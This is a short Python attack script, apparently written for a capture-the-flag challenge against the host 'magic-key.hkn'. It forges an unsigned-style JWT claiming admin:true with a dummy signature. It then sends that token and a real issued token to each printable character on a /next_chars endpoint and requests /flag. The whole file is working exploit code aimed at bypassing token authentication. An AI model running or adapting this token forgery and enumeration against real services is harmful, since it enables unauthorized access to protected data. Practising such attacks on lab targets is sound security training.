#!/usr/bin/env python3
import base64, json, time, string, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_true_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt_true = f"{header_b64}.{payload_true_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

real_issued_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInRpbWVzdGFtcCI6MTc5MjE0MzMyNX0.UDt9LKouwS5on0iRcT_0xynjjOSa_zcWMbZXWa8yeLI"

TARGET = "magic-key.hkn"

for label, jwt in [("forged admin:true", forged_jwt_true), ("real issued admin:false", real_issued_jwt)]:
    print(f"\n=== Sweeping magic-key.hkn/next_chars with JWT header = {label} ===")
    found_any = False
    for c in string.printable:
        if c in "\n\r\t\x0b\x0c":
            continue
        try:
            r = requests.get(f"http://{TARGET}/next_chars", params={"char": c},
                              headers={"JWT": jwt}, timeout=4)
            body = r.text.strip()
            if r.status_code == 200 and body not in ("[]", ""):
                print(f"  char={c!r} -> {r.status_code}: {body}")
                found_any = True
        except requests.exceptions.RequestException as e:
            print(f"  char={c!r} ERROR: {e}")
    if not found_any:
        print("  (no non-empty 200 responses for any character)")

    # Also just show one sample status for a baseline char to see if 401 vs 200 w/ empty
    r = requests.get(f"http://{TARGET}/next_chars", params={"char": "s"}, headers={"JWT": jwt}, timeout=4)
    print(f"  [baseline] char='s' -> {r.status_code}: {r.text.strip()[:150]}")

print("\n=== Also try /flag directly with each JWT ===")
for label, jwt in [("forged admin:true", forged_jwt_true), ("real issued admin:false", real_issued_jwt)]:
    r = requests.get(f"http://{TARGET}/flag", headers={"JWT": jwt}, timeout=5)
    print(f"  {label} -> {r.status_code}: {r.text.strip()[:200]}")
